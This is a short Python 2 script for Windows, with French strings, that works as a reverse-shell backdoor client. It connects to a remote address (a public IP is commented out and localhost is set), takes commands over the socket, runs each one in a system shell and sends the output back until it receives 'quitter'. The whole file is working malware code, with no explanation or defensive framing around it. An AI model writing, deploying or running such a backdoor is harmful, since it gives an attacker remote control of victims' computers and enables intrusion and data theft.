import socket
import subprocess
import sys
import os
from _winreg import *

def Connect():
    # host = " 90.18.76.18"
    host = "localhost"
    port = 1122
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    while True:

        commande =  sock.recv(1024)

        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            sock.close()
            break

        else:

            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            sock.send(shell.stdout.read() + shell.stderr.read())

def Main ():
    Connect()
Main()
